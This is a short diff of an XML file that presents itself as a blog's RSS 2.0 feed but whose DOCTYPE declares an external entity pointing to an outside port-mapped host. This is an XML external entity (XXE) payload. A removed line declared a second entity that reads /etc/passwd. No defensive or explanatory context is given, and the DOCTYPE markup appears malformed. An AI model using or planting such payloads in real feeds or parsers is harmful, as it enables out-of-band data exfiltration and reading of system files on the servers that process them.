@@ -1,6 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://jancuk223344-20863.portmap.host:20863"> ]>
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
